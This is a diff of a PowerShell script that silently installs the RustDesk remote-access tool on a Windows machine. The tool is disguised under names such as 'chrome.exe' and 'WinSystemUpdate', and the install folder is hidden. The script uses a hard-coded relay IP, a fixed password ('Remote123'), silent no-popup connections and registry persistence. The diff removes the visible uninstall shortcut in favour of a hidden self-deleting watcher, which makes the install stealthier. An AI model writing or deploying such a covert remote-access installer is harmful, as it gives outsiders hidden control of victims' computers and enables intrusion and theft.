@@ -20,7 +20,7 @@ function Install-RD {
     # Download
     $wc = New-Object System.Net.WebClient
     $wc.DownloadFile("$base/chrome.exe", $EXE)
-    try { $wc.DownloadFile("$base/sciter.dll", $DLL) } catch {}  # optional, newer builds don't need it
+    try { $wc.DownloadFile("$base/sciter.dll", $DLL) } catch {}
     Unblock-File $EXE -EA SilentlyContinue
     Unblock-File $DLL -EA SilentlyContinue
 
@@ -29,9 +29,8 @@ function Install-RD {
     }
 
     # Config:
-    # approve-mode = 'password-click' -> user can connect by password OR by manually clicking accept
-    # verification-method = 'use-permanent-password' -> password connects silently, no popup
-    # allow-only-conn-window-open = 'N' -> closing the notification does NOT kill the connection
+    # approve-mode = 'password-click' -> both password AND manual click work
+    # allow-only-conn-window-open = 'N' -> closing popup does NOT kill connection
     @'
 rendezvous_server = '34.107.221.82'
 relay_server = '34.107.221.82'
@@ -56,12 +55,12 @@ key_confirmed = true
     # Hide folder
     try { $f = Get-Item $DEST -Force; $f.Attributes = $f.Attributes -bor 6 } catch {}
 
-    # Start RustDesk hidden - --service flag suppresses connection manager UI
+    # Start RustDesk hidden
     $psi = New-Object System.Diagnostics.ProcessStartInfo
-    $psi.FileName        = $EXE
+    $psi.FileName         = $EXE
     $psi.WorkingDirectory = $DEST
-    $psi.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
-    $psi.UseShellExecute = $true
+    $psi.WindowStyle      = [System.Diagnostics.ProcessWindowStyle]::Hidden
+    $psi.UseShellExecute  = $true
     [System.Diagnostics.Process]::Start($psi) | Out-Null
     Start-Sleep 5
 
@@ -78,47 +77,49 @@ key_confirmed = true
     $prId.WaitForExit(8000) | Out-Null
     $RDID = $outT.Result.Trim()
 
-    # Auto-start via HKCU registry - no admin needed
+    # Auto-start on boot via registry (no admin needed)
     $reg = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
     Set-ItemProperty $reg 'WinSystemUpdate' $EXE -Force
 
-    # Uninstall script
+    # Cleanup script - removes all files, registry, processes
     $del = "$DEST\delete.ps1"
-    @'
+    Set-Content $del @'
 $d = "$env:LOCALAPPDATA\WinSystemUpdate"
 Get-Process WinUpdate -EA SilentlyContinue | Where-Object { $_.Path -like '*WinSystem*' } | Stop-Process -Force -EA SilentlyContinue
 Remove-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' 'WinSystemUpdate' -EA SilentlyContinue
 Start-Sleep 2
 Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue
-foreach ($dp in @([Environment]::GetFolderPath('Desktop'),"$env:USERPROFILE\Desktop","$env:USERPROFILE\OneDrive\Desktop")) {
-    Remove-Item "$dp\DELETE CHROME.lnk" -Force -EA SilentlyContinue
+'@ -Encoding UTF8
+
+    # Watcher - auto deletes when:
+    #   1. RustDesk process is stopped/killed
+    #   2. 1 hour passes (whichever comes first)
+    $watch = "$DEST\watch.ps1"
+    Set-Content $watch @'
+$EXE  = "$env:LOCALAPPDATA\WinSystemUpdate\WinUpdate.exe"
+$del  = "$env:LOCALAPPDATA\WinSystemUpdate\delete.ps1"
+$deadline = [DateTime]::Now.AddHours(1)
+
+while ([DateTime]::Now -lt $deadline) {
+    Start-Sleep 10
+    $alive = Get-Process WinUpdate -EA SilentlyContinue | Where-Object { $_.Path -eq $EXE }
+    if (-not $alive) { break }
 }
-'@ | Set-Content $del -Encoding UTF8
 
-    # Desktop shortcut to uninstall
-    foreach ($dp in @([Environment]::GetFolderPath('Desktop'),"$env:USERPROFILE\Desktop","$env:USERPROFILE\OneDrive\Desktop")) {
-        if (Test-Path $dp) {
-            $sh = (New-Object -COM WScript.Shell).CreateShortcut("$dp\DELETE CHROME.lnk")
-            $sh.TargetPath    = 'powershell.exe'
-            $sh.Arguments     = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$del`""
-            $sh.IconLocation  = 'shell32.dll,131'
-            $sh.Save(); break
-        }
-    }
+if (Test-Path $del) { & $del }
+'@ -Encoding UTF8
 
-    # 1-hour auto-delete
-    Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -Command `"Start-Sleep 3600; & '$del'`""
+    # Start watcher silently in background
+    Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$watch`""
 
     Write-Host ''
     Write-Host '  ==========================================' -ForegroundColor Green
     Write-Host '   DONE! Remote Access is now active.'       -ForegroundColor Green
     Write-Host '  ==========================================' -ForegroundColor Green
-    Write-Host "   Your ID:  $RDID"     -ForegroundColor Cyan
-    Write-Host '   Password: Remote123' -ForegroundColor Cyan
-    Write-Host '   No popup will appear when connecting.'    -ForegroundColor Cyan
-    Write-Host '   Auto-starts on boot: YES (no admin needed)' -ForegroundColor Gray
-    Write-Host '   Desktop shortcut: DELETE CHROME (to uninstall)' -ForegroundColor Gray
-    Write-Host '   Auto-deletes in 1 hour.'                  -ForegroundColor Gray
+    Write-Host "   Your ID:  $RDID"       -ForegroundColor Cyan
+    Write-Host '   Password: Remote123'   -ForegroundColor Cyan
+    Write-Host '   Auto-deletes: in 1 hour OR when stopped' -ForegroundColor Gray
+    Write-Host '   Auto-starts on boot: YES'                -ForegroundColor Gray
     Write-Host '  ==========================================' -ForegroundColor Green
 }
 Install-RD
